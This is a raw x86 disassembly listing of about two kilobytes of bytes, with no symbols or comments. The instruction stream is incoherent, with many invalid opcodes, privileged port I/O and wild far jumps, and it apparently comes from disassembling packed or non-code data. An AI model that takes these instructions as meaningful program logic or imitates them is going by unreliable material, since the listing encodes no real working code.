  423e88:	mov    ch,0x5b
  423e8a:	pop    eax
  423e8b:	adc    eax,0x76813f90
  423e90:	xor    BYTE PTR [esi+0x283f64e6],al
  423e96:	xor    eax,0x6304635b
  423e9b:	jne    0x423e6c
  423e9d:	xchg   esp,eax
  423e9e:	scas   al,BYTE PTR es:[edi]
  423e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ea0:	adc    ebp,0xf65630e6
  423ea6:	in     al,dx
  423ea7:	in     eax,0xe8
  423ea9:	cmp    al,0x4d
  423eab:	lods   al,BYTE PTR ds:[esi]
  423eac:	mov    edx,DWORD PTR [ebx+ebp*2+0x7bbf6410]
  423eb3:	nop
  423eb4:	lods   al,BYTE PTR ds:[esi]
  423eb5:	cmp    DWORD PTR [eax+0xf],eax
  423eb8:	outs   dx,BYTE PTR ds:[esi]
  423eb9:	es popa 
  423ebb:	jg     0x423ec0
  423ebd:	cmp    BYTE PTR [esi+ebp*1+0x60cdc234],dh
  423ec4:	and    BYTE PTR [esi-0x4c794974],ch
  423eca:	dec    esi
  423ecb:	pop    ss
  423ecc:	push   esp
  423ecd:	out    dx,eax
  423ece:	ret    
  423ecf:	push   esp
  423ed0:	mov    cl,0x90
  423ed2:	pop    ss
  423ed3:	div    BYTE PTR [edx+0x49]
  423ed6:	xor    dh,dh
  423ed8:	jg     0x423f4e
  423eda:	sub    DWORD PTR [ecx-0x6b1f9cdb],ebp
  423ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ee1:	xchg   DWORD PTR [eax],ecx
  423ee3:	jecxz  0x423e93
  423ee5:	gs jg  0x423ece
  423ee8:	out    0xf3,eax
  423eea:	mov    bh,0x1f
  423eec:	add    al,0xb
  423eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eef:	xchg   DWORD PTR [edx-0x7f],ecx
  423ef2:	mov    gs,esp
  423ef4:	sti    
  423ef5:	lods   eax,DWORD PTR ds:[esi]
  423ef6:	in     al,0xcc
  423ef8:	and    BYTE PTR [edx],cl
  423efa:	shl    BYTE PTR [ebx],cl
  423efc:	mov    ds:0x66da42d4,eax
  423f01:	mov    edx,0x25944a10
  423f06:	daa    
  423f07:	inc    ebx
  423f08:	test   eax,0x7b6ed33e
  423f0d:	ja     0x423f8c
  423f0f:	xchg   esp,eax
  423f10:	add    DWORD PTR [esi+0x5d506cb1],esp
  423f16:	in     eax,dx
  423f17:	jnp    0x423f60
  423f19:	mov    esi,0x25870e99
  423f1e:	sbb    esi,DWORD PTR [ecx+0x5689755c]
  423f24:	jbe    0x423f23
  423f26:	or     DWORD PTR [esi],ecx
  423f28:	rol    esi,0xf7
  423f2b:	les    esp,FWORD PTR [ecx]
  423f2d:	daa    
  423f2e:	and    al,0x74
  423f30:	es adc eax,0x30f0c125
  423f36:	cli    
  423f37:	cli    
  423f38:	lock jl 0x423f22
  423f3b:	sub    ecx,DWORD PTR [ebx+edi*4+0x6a]
  423f3f:	or     al,BYTE PTR [edi-0x92fb06b]
  423f45:	push   edi
  423f46:	add    DWORD PTR [ecx+ebp*2-0x2f8ca4],0x0
	...
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x10e902b9
  423f67:	push   edx
  423f68:	das    
  423f69:	in     al,0x81
  423f6b:	mov    eax,0x1fb0001
  423f70:	add    BYTE PTR [eax],al
  423f72:	sub    DWORD PTR [edi+edi*4+0x3a],ecx
  423f76:	retf   0xb8b3
  423f79:	(bad)  
  423f7a:	mul    DWORD PTR [ecx-0x64]
  423f7d:	mov    ds:0x4e2d1e9,eax
  423f82:	sbb    DWORD PTR [ebx+0x270d987d],0xb3612af0
  423f8c:	push   esi
  423f8d:	fs pusha 
  423f8f:	mov    al,0xa1
  423f91:	add    ebx,edi
  423f93:	pusha  
  423f94:	jnp    0x42400f
  423f96:	and    eax,0x8032cd2b
  423f9b:	nop
  423f9c:	inc    esi
  423f9d:	add    al,BYTE PTR [ebx-0x5c]
  423fa0:	adc    ah,BYTE PTR [eax]
  423fa2:	cwde   
  423fa3:	das    
  423fa4:	fisttp DWORD PTR [eax-0x5f]
  423fa7:	or     ch,bl
  423fa9:	mov    dl,0xfd
  423fab:	pop    edi
  423fac:	inc    edi
  423fad:	in     al,0xe
  423faf:	sbb    eax,0xe6fec335
  423fb4:	div    DWORD PTR [ebx+ebx*2+0x21385c5b]
  423fbb:	push   esi
  423fbc:	inc    ebx
  423fbd:	pop    esp
  423fbe:	push   cs
  423fbf:	xchg   edi,eax
  423fc0:	dec    eax
  423fc1:	push   edx
  423fc2:	pop    ss
  423fc3:	or     bh,al
  423fc5:	add    ebx,DWORD PTR [ebp+0x4b]
  423fc8:	mov    eax,0xbb5e01c
  423fcd:	aad    0xce
  423fcf:	mov    edi,0x17ba47bd
  423fd4:	mov    esi,0x6a0e656e
  423fd9:	(bad)  [edx]
  423fdb:	fstp   QWORD PTR [eax+0x4a13e8c0]
  423fe1:	mov    edi,0xfce2bbf6
  423fe6:	add    ecx,ecx
  423fe8:	dec    edx
  423fe9:	xchg   ebx,eax
  423fea:	movzx  ebx,BYTE PTR [edi]
  423fed:	push   ecx
  423fee:	add    ebp,ebp
  423ff0:	jb     0x423fba
  423ff2:	jp     0x42405b
  423ff4:	inc    ecx
  423ff5:	xor    bh,BYTE PTR [ecx-0x3447def2]
  423ffb:	sub    dh,bh
  423ffd:	mov    WORD PTR [esi+0x75],cs
  424000:	and    al,BYTE PTR [edx+0xc82b09b]
  424006:	imul   ebx,DWORD PTR ds:0x95fc57c0,0x811be590
  424010:	cwde   
  424011:	mov    BYTE PTR [edi],dl
  424013:	or     bh,BYTE PTR [ebx]
  424015:	loope  0x42405d
  424017:	push   ebx
  424018:	xchg   esi,eax
  424019:	int    0x2c
  42401b:	test   BYTE PTR [ebx-0x7d8acda1],bl
  424021:	das    
  424022:	bound  ebx,QWORD PTR [edi-0x23]
  424025:	cmp    ebp,esp
  424027:	push   0x1f
  424029:	cmp    DWORD PTR [edx],esi
  42402b:	mov    WORD PTR [ebx+0x69287df],cs
  424031:	jge    0x4240b2
  424033:	retf   
  424034:	sub    dl,BYTE PTR [edx+0x39]
  424037:	pop    eax
  424038:	adc    eax,0xd425a2e0
  42403d:	xor    ebp,edx
  42403f:	fnstsw WORD PTR [ebx-0x127a6020]
  424045:	sub    esp,DWORD PTR [edi+0x76b22ef3]
  42404b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42404c:	cmp    al,0x34
  42404e:	dec    ecx
  42404f:	or     al,0x7f
  424051:	nop
  424052:	mov    cl,al
  424054:	jae    0x423fe9
  424056:	int3   
  424057:	sub    eax,0xa70049e3
  42405c:	inc    edi
  42405d:	jecxz  0x42409a
  42405f:	cs push eax
  424061:	adc    eax,0x6105aa42
  424066:	xchg   ecx,eax
  424067:	mov    bh,0x7f
  424069:	div    BYTE PTR [ecx+0x2a]
  42406c:	das    
  42406d:	cmc    
  42406e:	loope  0x4240b9
  424070:	add    bl,BYTE PTR [edx]
  424072:	or     al,0xbc
  424074:	jns    0x424046
  424076:	mov    edi,0x3528d6ca
  42407b:	adc    BYTE PTR ds:0x7411b485,0xca
  424082:	push   0xcca950f0
  424087:	or     al,0x42
  424089:	out    dx,al
  42408a:	and    eax,0x911542fc
  42408f:	div    BYTE PTR [ecx+0x1d61bbee]
  424095:	sbb    BYTE PTR [ecx],ch
  424097:	add    eax,0xf7102a13
  42409c:	cmc    
  42409d:	jno    0x4240ee
  42409f:	sbb    BYTE PTR [ecx-0x4d3230c],0x6
  4240a6:	xchg   ecx,eax
  4240a7:	xor    al,0x6e
  4240a9:	dec    ecx
  4240aa:	ins    BYTE PTR es:[edi],dx
  4240ab:	add    eax,0xc9f4af19
  4240b0:	inc    ecx
  4240b1:	btr    DWORD PTR [esi],ecx
  4240b4:	pushf  
  4240b5:	int3   
  4240b6:	push   edi
  4240b7:	add    DWORD PTR [ecx+ebx*2],0xffffffc3
  4240bb:	aaa    
  4240bc:	mov    esi,0x25001cb5
  4240c1:	dec    ebx
  4240c2:	dec    esp
  4240c3:	mov    ds:0xda82e200,al
  4240c8:	aaa    
  4240c9:	sub    DWORD PTR [ecx+ecx*8+0xf],edi
  4240cd:	or     BYTE PTR [ebx-0x19],cl
  4240d0:	daa    
  4240d1:	push   esi
  4240d2:	dec    esi
  4240d3:	lds    esp,FWORD PTR [ecx-0x1a3fd361]
  4240d9:	clc    
  4240da:	dec    esp
  4240db:	ja     0x424094
  4240dd:	sbb    DWORD PTR [esi],ebp
  4240df:	scas   al,BYTE PTR es:[edi]
  4240e0:	cmp    eax,0x5b64b8dd
  4240e5:	push   ecx
  4240e6:	mov    edx,0x18f8906d
  4240eb:	xor    eax,0x2b86115
  4240f0:	push   es
  4240f1:	xor    dl,BYTE PTR [edi+0x342c4dae]
  4240f7:	inc    esi
  4240f8:	adc    ebx,DWORD PTR [edx]
  4240fa:	sub    DWORD PTR [ebp+0x72],esp
  4240fd:	stos   DWORD PTR es:[edi],eax
  4240fe:	xor    BYTE PTR [edx-0x2ead581a],0xd5
  424105:	pop    esi
  424106:	bound  eax,QWORD PTR [ebp+eax*4+0x2d287d47]
  42410d:	mov    edx,0x7127b262
  424112:	adc    BYTE PTR [edi],ch
  424114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424115:	inc    edi
  424116:	sub    DWORD PTR [eax],edx
  424118:	and    BYTE PTR [esi+0x2d],0xcb
  42411c:	daa    
  42411d:	mov    al,ds:0x84815c86
  424122:	sub    esp,DWORD PTR [ecx]
  424124:	or     ah,ah
  424126:	add    DWORD PTR [edi+0x921ff54],0x70ca2ff5
  424130:	xchg   BYTE PTR [ebp+0x14168cf5],bh
  424136:	jbe    0x424194
  424138:	lds    ebx,FWORD PTR [ebx]
  42413a:	mov    bl,0xa5
  42413c:	idiv   ch
  42413e:	sahf   
  42413f:	adc    ecx,esp
  424141:	sahf   
  424142:	jno    0x4240e7
  424144:	pop    es
  424145:	jns    0x42416d
  424147:	mov    WORD PTR [esi+0x28821476],cs
  42414d:	adc    bh,ah
  42414f:	fdiv   DWORD PTR [ebp+0x184ad604]
  424155:	mov    eax,ds:0xd7778364
  42415a:	xor    eax,0x4f3a2336
  42415f:	add    eax,0x78b6608a
  424164:	dec    ebp
  424165:	xor    BYTE PTR [eax],bl
  424167:	pop    es
  424168:	mov    ds:0x8ac9b723,eax
	...
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	cdq    
  424187:	mov    ds:0xba7c5aa7,al
  42418c:	add    DWORD PTR [eax],eax
  42418e:	sti    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [edx+edi*4-0x55],ch
  424195:	pop    ebx
  424196:	pusha  
  424197:	inc    esp
  424198:	enter  0xa981,0xcd
  42419c:	adc    ah,0x66
  42419f:	jmp    0x4c41ea31
  4241a4:	sar    BYTE PTR [eax+0x55117d13],1
  4241aa:	inc    ebx
  4241ab:	pushf  
  4241ac:	jnp    0x4241e9
  4241ae:	pop    ebp
  4241af:	mov    ebx,ebx
  4241b1:	fadd   st(3),st
  4241b3:	xlat   BYTE PTR ds:[ebx]
  4241b4:	fwait
  4241b5:	sub    cl,BYTE PTR [ebp-0x26]
  4241b8:	jmp    0x97b99b4c
  4241bd:	xor    al,0x1a
  4241bf:	cmp    ah,0xe
  4241c2:	jnp    0x424194
  4241c4:	cwde   
  4241c5:	shl    eax,1
  4241c7:	mov    ah,BYTE PTR [esi]
  4241c9:	and    al,BYTE PTR [edx]
  4241cb:	mov    bh,0xd2
  4241cd:	lds    ebp,FWORD PTR [eax-0x6fc27b2f]
  4241d3:	jle    0x4241b9
  4241d5:	inc    ecx
  4241d6:	pop    eax
  4241d7:	out    0x73,al
  4241d9:	push   es
  4241da:	repnz repz in eax,dx
  4241dd:	dec    esi
  4241de:	xor    eax,0x6bd32275
  4241e3:	and    cl,dh
  4241e5:	push   ebp
  4241e6:	int    0x19
  4241e8:	aaa    
  4241e9:	sub    BYTE PTR [eax-0x2e],al
  4241ec:	dec    edi
  4241ed:	ret    0xa829
  4241f0:	into   
  4241f1:	fst    DWORD PTR [eax-0x7f836ce5]
  4241f7:	cli    
  4241f8:	sbb    DWORD PTR [ecx+edx*4+0x5394bdca],0x5a
  424200:	mov    ah,0xb4
  424202:	sbb    eax,0xc657a022
  424207:	pop    esp
  424208:	sbb    al,0xeb
  42420b:	shr    DWORD PTR [eax+0x5d],1
  42420e:	push   ebx
  42420f:	push   ss
  424210:	and    cl,cl
  424212:	mov    WORD PTR [eax-0x5cb41742],ss
  424218:	lods   eax,DWORD PTR ds:[esi]
  424219:	pop    es
  42421a:	inc    ebp
  42421b:	sub    dh,al
  42421d:	in     al,0x6d
  42421f:	cld    
  424220:	addr16 int 0x4e
  424223:	jo     0x42427f
  424225:	dec    eax
  424226:	pop    DWORD PTR [ebp-0x62]
  424229:	cmp    eax,ebx
  42422b:	loopne 0x424274
  42422d:	mov    edx,0x98e37eaf
  424232:	sub    ah,BYTE PTR [ecx]
  424234:	mov    ds:0xc5526059,al
  424239:	ret    0xc0ba
  42423c:	test   BYTE PTR [esp+eiz*8],bl
  42423f:	pop    edx
  424240:	jmp    0x9ac139b2
  424245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424246:	sub    ax,0xe54a
  42424a:	(bad)  
  42424b:	cmp    eax,0x151be2dd
  424250:	inc    BYTE PTR [edi+edx*1-0x6226163a]
  424257:	xchg   esi,eax
  424258:	jg     0x4242be
  42425a:	sub    DWORD PTR [ebp+edx*4+0x21],ecx
  42425e:	ret    
  42425f:	mov    eax,0x2157eed7
  424264:	(bad)  
  424265:	mov    dh,0xb1
  424267:	in     al,0x88
  424269:	in     eax,0x45
  42426b:	fst    QWORD PTR [edx-0x6a]
  42426e:	mov    ebp,0xfa4fa76e
  424273:	cli    
  424274:	sub    DWORD PTR [ebp-0x22],ecx
  424277:	xchg   DWORD PTR [esi],ebp
  424279:	imul   ebp,DWORD PTR [ebp-0x4ca755e2],0xffffffc8
  424280:	imul   ecx,ebx,0xbe2eef0
  424286:	subps  xmm1,xmm6
  424289:	aas    
  42428a:	mov    ah,0x62
  42428c:	test   eax,0x3c8b1f16
  424291:	pop    es
  424292:	pusha  
  424293:	add    dl,BYTE PTR gs:[ebx-0x62591251]
  42429a:	mov    al,BYTE PTR [eax+0x24]
  42429d:	hlt    
  42429e:	sbb    DWORD PTR [ebp+0x5019d57b],eax
  4242a4:	retf   0x16d3
  4242a7:	pop    esp
  4242a8:	arpl   WORD PTR [ebp+0x61],si
  4242ab:	jbe    0x4242d2
  4242ad:	(bad)  
  4242ae:	nop
  4242af:	pop    edi
  4242b0:	pop    ds
  4242b1:	out    0xbb,eax
  4242b3:	xchg   edx,eax
  4242b4:	mov    dh,0xb3
  4242b6:	fwait
  4242b7:	jl     0x42424b
  4242b9:	dec    edx
  4242ba:	jp     0x424338
  4242bc:	mov    dl,0x4
  4242be:	int3   
  4242bf:	jmp    0xe9f8ef0b
  4242c4:	push   0x74
  4242c6:	push   edx
  4242c7:	call   0x1cb2:0x5d415a09
  4242ce:	xchg   ecx,eax
  4242cf:	sbb    dl,bh
  4242d1:	sar    DWORD PTR [eax+0x47a8644c],0x8b
  4242d8:	adc    BYTE PTR [ebp-0x25],dl
  4242db:	and    DWORD PTR [eax-0x6857a1c6],0xfd29ad02
  4242e5:	sub    eax,0x2c20f932
  4242ea:	ret    
  4242eb:	pop    es
  4242ec:	adc    DWORD PTR [edx+0x16690c80],0xffffffc7
  4242f3:	les    ebx,FWORD PTR [ecx+ecx*1-0x4cc70dfa]
  4242fa:	das    
  4242fb:	jb     0x4242be
  4242fd:	add    ebx,DWORD PTR [edx-0xe593aee]
  424303:	add    eax,0xae19cb2b
  424308:	ror    BYTE PTR ds:0xf22bb899,1
  42430e:	gs js  0x42429e
  424311:	jns    0x42432f
  424313:	and    bh,BYTE PTR [edx+edx*8+0x7e]
  424317:	inc    edx
  424318:	sub    DWORD PTR [eax],ecx
  42431a:	retf   
  42431b:	dec    edi
  42431c:	shl    BYTE PTR [ecx+0x20],1
  42431f:	xchg   BYTE PTR [ebp-0x19902946],ah
  424325:	mov    edx,0xf9a156bc
  42432a:	(bad)
  42432d:	mov    edx,0x534d053c
  424332:	mov    ebp,DWORD PTR [edi+0x6a]
  424335:	mov    ds:0x5c13854c,eax
  42433b:	or     DWORD PTR [edx-0x32],ecx
  42433e:	std    
  42433f:	cmp    BYTE PTR [eax+0x90ee6f8],ch
  424345:	sub    eax,0xd106e5eb
  42434a:	test   BYTE PTR [edx*4+0x7c2c90bc],bl
  424351:	cmp    al,0x32
  424353:	pavgw  mm3,QWORD PTR [edi-0x6]
  424357:	ds sar ebp,1
  42435a:	retf   
  42435b:	add    al,0x98
  42435d:	scas   al,BYTE PTR es:[edi]
  42435e:	hlt    
  42435f:	int3   
  424360:	addr16 sbb al,0x56
  424363:	into   
  424364:	mov    ebx,0x1300ace0
  424369:	lahf   
  42436a:	popf   
  42436b:	jmp    0xe657:0x44480e13
  424372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424373:	test   BYTE PTR [ecx-0x78],bh
  424376:	leave  
  424377:	xor    DWORD PTR [ecx],edx
  424379:	and    BYTE PTR [ebx-0x53e3c74f],bh
  42437f:	out    0xc9,al
  424381:	pop    edx
  424382:	sbb    BYTE PTR [edi],0xc1
  424385:	pop    ecx
  424386:	stos   DWORD PTR es:[edi],eax
  424387:	add    cl,ah
  424389:	xor    DWORD PTR [ebp-0x80],esp
  42438c:	push   ebx
	...
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	jne    0x4243e9
  4243a8:	cli    
  4243a9:	jmp    0x1fb:0x1bc77
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	xchg   ebx,eax
  4243b3:	(bad)  [ebx]
  4243b5:	call   0xd5e0bd0d
  4243ba:	jge    0x4243f8
  4243bc:	and    edx,edx
  4243be:	xchg   esp,eax
  4243bf:	mov    esi,0xa2139d20
  4243c4:	adc    al,0xd2
  4243c6:	cmp    ecx,edi
  4243c8:	es push esi
  4243ca:	push   ss
  4243cb:	out    dx,al
  4243cc:	pop    ebp
  4243cd:	push   eax
  4243ce:	sub    DWORD PTR [esi+0x586a1f63],edx
  4243d4:	xchg   edi,eax
  4243d5:	mov    ds:0xaab6a8a0,eax
  4243da:	ret    0xcaca
  4243dd:	dec    edx
  4243de:	dec    esp
  4243df:	call   0x36b3:0x5d96eb55
  4243e6:	dec    ebx
  4243e7:	fwait
  4243e8:	sbb    dh,al
  4243ea:	aam    0xf0
  4243ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243ed:	mov    bl,0x9a
  4243ef:	hlt    
  4243f0:	out    dx,al
  4243f1:	pop    esi
  4243f2:	je     0x424401
  4243f4:	in     eax,dx
  4243f5:	sbb    ch,BYTE PTR [edi+edi*4+0x11]
  4243f9:	xlat   BYTE PTR ds:[ebx]
  4243fa:	mov    dl,0x3a
  4243fc:	test   al,0x67
  4243fe:	sub    ebp,edi
  424400:	xor    eax,0x6e42bcd0
  424405:	cmp    DWORD PTR cs:[ebx],ecx
  424408:	out    0xa9,al
  42440a:	inc    edi
  42440b:	sar    DWORD PTR [edi-0x60],0xae
  42440f:	push   cs
  424410:	sub    eax,0xfa4742ba
  424415:	into   
  424416:	push   0xffffff8b
  424418:	ds mov dh,0xdf
  42441b:	jp     0x4243aa
  42441d:	stos   BYTE PTR es:[edi],al
  42441e:	push   ebx
  42441f:	jmp    0xb87d:0x41fea925
  424426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424428:	mov    ds:0xa6a5f0f9,al
  42442d:	call   0xff3c:0xa0f5e1e0
  424434:	icebp  
  424435:	icebp  
  424436:	(bad)  
  424437:	lock retf 0x726b
  42443b:	inc    edi
  42443c:	call   0x7a9c2ff0
  424441:	jg     0x4243f6
  424443:	inc    esp
  424444:	cmp    ebx,DWORD PTR [esi]
  424446:	dec    eax
  424447:	add    dl,dh
  424449:	cmp    al,0xe2
  42444b:	push   esp
  42444c:	pushf  
  42444d:	jg     0x4243da
  42444f:	xor    eax,0x96621e9b
  424454:	shl    BYTE PTR [ebp-0x27504ba1],0xeb
  42445b:	por    mm2,QWORD PTR [ebx+edx*8+0x22f85d03]
  424463:	stc    
  424464:	lds    edx,FWORD PTR [edx+0x16]
  424467:	leave  
  424468:	or     eax,0x7bddbde8
  42446d:	xchg   DWORD PTR [esi-0x7d],esi
  424470:	rcl    DWORD PTR [esi-0x1ce5af16],0xea
  424477:	call   0x5e854344
  42447c:	mov    ch,0xa1
  42447e:	scas   al,BYTE PTR es:[edi]
  42447f:	jbe    0x4244b9
  424481:	lods   eax,DWORD PTR ds:[esi]
  424482:	pop    eax
  424483:	lea    esi,ds:0xec3811e0
  424489:	test   ah,bl
  42448b:	or     al,0xf6
  42448d:	into   
  42448e:	add    esi,0xffffff81
  424491:	sbb    eax,0xb9bff733
  424496:	mov    bh,0x4a
  424498:	xchg   esp,eax
  424499:	aas    
  42449a:	push   ebx
  42449b:	and    edi,ebx
  42449d:	push   ecx
  42449e:	aam    0x3f
  4244a0:	icebp  
  4244a1:	ret    0xb2a4
  4244a4:	fmul   DWORD PTR [edx]
  4244a6:	cs add al,0x66
  4244a9:	fwait
  4244aa:	test   al,0x14
  4244ac:	test   eax,0x1f7ffcfe
  4244b1:	xor    eax,DWORD PTR [eax]
  4244b3:	xchg   DWORD PTR [esi-0x4],esi
  4244b6:	push   ds
  4244b7:	or     DWORD PTR [edx+ebp*1],0x37
  4244bb:	bound  ebp,QWORD PTR [ecx+0xb]
  4244be:	rcl    BYTE PTR ds:0x559ac003,cl
  4244c4:	cmp    al,0xe9
  4244c6:	dec    ebx
  4244c7:	mov    BYTE PTR [ebx],dh
  4244c9:	scas   al,BYTE PTR es:[edi]
  4244ca:	mov    ds:0xb04890e8,eax
  4244cf:	xchg   esp,eax
  4244d0:	jo     0xbc161cbf
  4244d6:	hlt    
  4244d7:	mov    bl,0xde
  4244d9:	fwait
  4244da:	cli    
  4244db:	xlat   BYTE PTR ds:[ebx]
  4244dc:	xchg   esi,eax
  4244dd:	mov    ebx,0xbbb04fcb
  4244e2:	rcl    BYTE PTR [ebp+0x334dbc08],1
  4244e8:	push   ebx
  4244e9:	les    esi,FWORD PTR ds:0x3255deb3
  4244ef:	fwait
  4244f0:	push   ss
  4244f1:	retf   
  4244f2:	ss stos BYTE PTR es:[edi],al
  4244f4:	(bad)  
  4244f5:	pop    edx
  4244f6:	loope  0x424572
  4244f8:	sub    ebp,ebp
  4244fa:	in     al,dx
  4244fb:	push   ebp
  4244fc:	mov    gs,ecx
  4244fe:	leave  
  4244ff:	mov    ds:0x167074e1,al
  424504:	push   edx
  424505:	dec    ecx
  424506:	pushf  
  424507:	or     edi,0xffffff80
  42450a:	and    cl,ch
  42450c:	pop    edi
  42450d:	jb     0x42451b
  42450f:	clc    
  424510:	xchg   DWORD PTR [edx-0x9],ecx
  424513:	imul   ebp,DWORD PTR [eax-0x78235708],0x2b
  42451a:	xor    esp,edi
  42451c:	call   0xafc55c73
  424521:	xor    cl,BYTE PTR [ebx]
  424523:	jecxz  0x42459c
  424525:	sub    eax,0xa4cc4496
  42452a:	imul   BYTE PTR [ecx-0x3]
  42452d:	mov    eax,0xf97e8330
  424532:	sub    edx,DWORD PTR [esi+0x4b1851dd]
  424538:	fldenv [ebp-0x16]
  42453b:	stos   BYTE PTR es:[edi],al
  42453c:	xchg   esp,eax
  42453d:	(bad)  
  42453e:	mov    BYTE PTR [ebx],dh
  424540:	test   BYTE PTR [esi],ah
  424542:	jecxz  0x4245b7
  424544:	cmp    DWORD PTR [edx-0x5d],eax
  424547:	push   ds
  424548:	sbb    DWORD PTR [ecx-0x15],edx
  42454b:	das    
  42454c:	xor    eax,0x1f6a7431
  424551:	jl     0x4245c1
  424553:	pop    esp
  424554:	mov    esp,0xcedff1c8
  424559:	iret   
  42455a:	loopne 0x42455d
  42455c:	mov    ds:0xcf9fcc14,al
  424561:	stos   DWORD PTR es:[edi],eax
  424562:	out    dx,al
  424563:	mov    edx,0xe0c49776
  424568:	(bad)  
  424569:	lods   al,BYTE PTR ds:[esi]
  42456a:	ds adc dl,dl
  42456d:	mov    dl,0xf1
  42456f:	repnz jmp 0xc718:0x8d84ba51
  424577:	int    0x77
  424579:	shl    ch,cl
  42457b:	ret    0x1e0a
  42457e:	in     al,0xfa
  424580:	sbb    cl,dh
  424582:	fbstp  TBYTE PTR [edi-0x77710948]
  424588:	sub    BYTE PTR [ecx],al
  42458a:	cmp    eax,0x8f4c9391
  42458f:	arpl   WORD PTR [edi+edi*8-0x33],bx
  424593:	sti    
  424594:	cmp    DWORD PTR [eax],ecx
  424596:	push   ss
  424597:	dec    edi
  424598:	js     0x424523
  42459a:	mov    bl,0xf2
  42459c:	fidiv  WORD PTR es:[edx-0x5a08e618]
  4245a3:	add    dl,dl
  4245a5:	stc    
  4245a6:	std    
  4245a7:	fisttp DWORD PTR [ecx]
  4245a9:	and    edi,DWORD PTR es:[edi]
  4245ac:	pop    ebx
	...
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x5e5f61b7]
  4245c9:	mov    ?,WORD PTR [edx-0x42]
  4245cc:	add    DWORD PTR [eax],eax
  4245ce:	sti    
  4245cf:	add    DWORD PTR [eax],eax
  4245d1:	add    BYTE PTR [ebx],ch
  4245d3:	dec    esp
  4245d4:	shl    BYTE PTR [esi+eiz*2+0x2f126211],0x39
  4245dc:	pop    ds
  4245dd:	add    bl,BYTE PTR ds:0x805fa611
  4245e3:	test   ebx,0xbd8ad1f1
  4245e9:	aas    
  4245ea:	in     eax,0xe2
  4245ec:	jnp    0x424645
  4245ee:	popa   
  4245ef:	cli    
  4245f0:	fcmovnbe st,st(1)
  4245f2:	pop    edi
  4245f3:	inc    edx
  4245f4:	mov    WORD PTR [ebx+0x6a],ds
  4245f7:	dec    edi
  4245f8:	cmc    
  4245f9:	xchg   esp,eax
  4245fa:	pop    ecx
  4245fb:	idiv   DWORD PTR ds:0x8aeaedda
  424601:	push   ebp
  424602:	sbb    ebx,DWORD PTR [eax]
  424604:	add    eax,DWORD PTR [esp+edx*8+0x552ede6f]
  42460b:	sar    DWORD PTR [ebx+0x4bc40903],1
  424611:	jno    0x42468f
  424613:	ss add al,0x67
  424616:	jmp    0x42461c
  424618:	or     eax,0xa2f2baa3
  42461d:	mov    DWORD PTR [esi+eax*8-0x15],ecx
  424621:	lods   eax,DWORD PTR ds:[esi]
  424622:	(bad)  
  424624:	enter  0xf3c5,0xf4
  424628:	inc    edi
  424629:	outs   dx,DWORD PTR ds:[esi]
  42462a:	mov    esi,0x3b23c3d4
  42462f:	mov    esi,0xc7f4737a
  424634:	pop    ebp
  424635:	and    DWORD PTR [ebp+0x5ad7da83],0xcd434fb8
  42463f:	cmp    al,0xf7
  424641:	or     al,BYTE PTR [edi+0x1c]
  424644:	fnstsw WORD PTR [esi+0x5cde90a7]
  42464a:	adc    ah,al
  42464c:	test   BYTE PTR [edi],0x33
  42464f:	rcr    DWORD PTR [ebx+0x4ecafa73],1
  424655:	dec    eax
  424656:	mov    cl,0xbe
  424658:	fimul  WORD PTR [ecx-0x1d]
  42465b:	addr16 sub eax,0xdae50136
  424661:	shl    DWORD PTR ds:0x7fd32fac,0x52
  424668:	iret   
  424669:	imul   eax,DWORD PTR [esi],0x1d
  42466c:	xor    ebx,esi
  42466e:	loop   0x4246be
  424670:	cli    
  424671:	jae    0x4246ef
  424673:	jg     0x4246f2
  424675:	fnstcw WORD PTR [esi]
  424677:	push   ebx
  424678:	mov    ebx,0xa08205f1
  42467d:	pop    edx
  42467e:	jno    0x42462e
  424680:	and    bh,BYTE PTR [edi]
  424682:	adc    ch,BYTE PTR [edx]
  424684:	sbb    BYTE PTR [eax],ch
  424686:	adc    BYTE PTR [edi+0x34],ah
  424689:	cmp    DWORD PTR [ebx-0x6bc0760f],eax
  42468f:	push   ds
  424690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424691:	retf   
  424692:	xor    al,dh
  424694:	sub    ebx,DWORD PTR [edx]
  424696:	or     al,0xe3
  424698:	pop    esp
  424699:	or     eax,0x6b7b08d1
  42469e:	popa   
  42469f:	(bad)  
  4246a0:	scas   al,BYTE PTR es:[edi]
  4246a1:	call   0xc045:0xe8cf8ba3
  4246a8:	gs js  0x42466a
  4246ab:	push   esi
  4246ac:	std    
  4246ad:	cmp    eax,0x4f9b1384
  4246b2:	push   ds
  4246b3:	loop   0x4246a0
  4246b5:	aas    
  4246b6:	out    dx,eax
  4246b7:	push   edx
  4246b8:	popf   
  4246b9:	clc    
  4246ba:	xchg   edx,eax
  4246bb:	addr16 sar edi,0x33
  4246bf:	add    al,0xba
  4246c1:	aaa    
  4246c2:	push   ebx
  4246c3:	cwde   
  4246c4:	inc    ecx
  4246c5:	dec    ebx
  4246c6:	retf   0xa09f
  4246c9:	mov    esp,0x360c2833
  4246ce:	push   ds
